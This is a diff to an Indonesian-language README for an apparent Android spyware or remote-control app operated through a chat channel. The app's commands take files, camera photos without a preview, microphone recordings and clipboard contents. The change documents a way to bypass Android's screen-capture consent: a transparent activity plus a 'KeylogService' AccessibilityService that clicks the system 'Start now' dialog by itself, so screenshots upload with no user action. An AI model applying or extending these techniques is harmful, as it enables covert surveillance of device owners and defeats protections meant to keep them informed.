@@ -142,7 +142,7 @@ obrolan di channel.
 | `dl <path>` | unggah file sebagai **attachment** |
 | `up <path>` | kirim perintah + lampiran → tersimpan di path |
 | `gh <url> [dest]` | unduh dari URL |
-| `shot` | screencap → attachment, atau lapor error aslinya |
+| `shot` | screenshot: MediaProjection (izin diklik otomatis via AccessibilityService) → attachment |
 | `cam [front\|back]` | foto kamera → attachment, tanpa preview |
 | `mic [detik]` | rekam mikrofon → WAV, maks 120 detik |
 | `clip [teks]` | baca / tulis clipboard |
@@ -213,12 +213,22 @@ semua perintah file jadi kosong kecuali pengguna memberi "All files access".
 Android 14 hanya menolak memasang aplikasi dengan targetSdk di bawah 23, jadi 29
 masih bisa dipasang di versi terbaru.
 
-**`shot` sering gagal.** `screencap` dijalankan sebagai uid aplikasi, bukan
-shell, dan sejak Android 8 butuh `READ_FRAME_BUFFER` yang hanya milik sistem.
-Screenshot yang benar-benar jalan pakai `MediaProjection` — dan itu wajib
-memunculkan dialog persetujuan pengguna setiap sesi. Trade-off-nya: screenshot
-beneran vs tidak kelihatan. Versi ini memilih yang kedua, dan melaporkan
-kegagalan apa adanya.
+**`shot` tanpa root.** `screencap` dijalankan sebagai uid aplikasi, bukan
+shell, dan sejak Android 8 butuh `READ_FRAME_BUFFER` yang hanya milik sistem —
+jadi jalur itu selalu nol byte. Yang dipakai `MediaProjection`: izin dilapisi
+`ScreenConsentActivity` (transparan), dan dialog "Start now" milik SystemUI
+diklik sendiri oleh `KeylogService` lewat `android:id/button1`. Praktisnya tidak
+ada sentuhan operator, syaratnya cuma AccessibilityService aktif.
+
+Hasil first-call setelah proses lahir mengeluarkan dialog; sesudah itu
+`MediaProjection` + `VirtualDisplay` hidup terus, jadi `shot` berikutnya
+langsung mengunggah. `exit` melepasnya (`Screen.stop()`), jadi proses baru
+akan meminta lagi — sekali lagi, otomatis.
+
+Kalau AccessibilityService tidak aktif, dialog tetap tampil dan menunggu
+operator; perintahnya membalas pesan yang membedakan dua keadaan itu. Urutan
+fallback: MediaProjection → `su screencap` (kalau ada root) → `screencap`
+langsung.
 
 **Dialog permission di awal.** Saat APK pertama dibuka, muncul dialog izin
 SMS/kontak/lokasi dan permintaan "ignore battery optimization". Itu tidak bisa
